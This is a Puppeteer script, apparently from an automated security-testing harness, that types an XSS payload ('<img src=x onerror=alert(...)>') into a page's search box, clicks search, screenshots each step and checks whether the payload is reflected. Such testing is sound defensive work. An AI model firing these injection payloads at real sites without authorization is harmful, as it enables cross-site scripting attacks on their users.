import path from 'path';

export default async function(page, fileUrl, screenshotsDir) {
  try {
    // Navigate to the HTML file with different wait strategy
    await page.goto(fileUrl, { waitUntil: 'domcontentloaded' });

    // Wait for critical elements to be present
    await page.waitForSelector('#searchInput', { timeout: 10000 });
    await page.waitForSelector('.search-btn', { timeout: 10000 });

    // Take initial screenshot
    const screenshots = [];
    await page.screenshot({ path: path.join(screenshotsDir, 'step_1_initial.png') });
    screenshots.push(path.join(screenshotsDir, 'step_1_initial.png'));

    // Attempt XSS via search input with different payload
    const xssPayload = '<img src=x onerror=alert("XSS")>';

    // Clear input first using different selector strategy
    await page.click('#searchInput', { clickCount: 3 });
    await page.keyboard.press('Backspace');

    // Type XSS payload
    await page.type('#searchInput', xssPayload, { delay: 50 });

    // Take screenshot after input
    await page.screenshot({ path: path.join(screenshotsDir, 'step_2_xss_input.png') });
    screenshots.push(path.join(screenshotsDir, 'step_2_xss_input.png'));

    // Click search button using different selector
    await page.click('button.search-btn');

    // Wait for potential DOM changes
    await page.waitForTimeout(2000);

    // Take final screenshot
    await page.screenshot({ path: path.join(screenshotsDir, 'step_3_after_search.png') });
    screenshots.push(path.join(screenshotsDir, 'step_3_after_search.png'));

    // Check if payload is reflected in page content
    const pageContent = await page.content();
    const isPayloadReflected = pageContent.includes(xssPayload);

    return {
      success: true,
      action: "Attempted XSS injection via search input with payload: " + xssPayload,
      extractedData: {
        payloadReflected: isPayloadReflected,
        pageTitle: await page.title(),
        searchInputValue: await page.$eval('#searchInput', el => el.value)
      },
      screenshots,
      error: null
    };
  } catch (error) {
    return {
      success: false,
      action: "Failed to complete XSS injection attempt",
      extractedData: {},
      screenshots: [],
      error: error.message
    };
  }
}
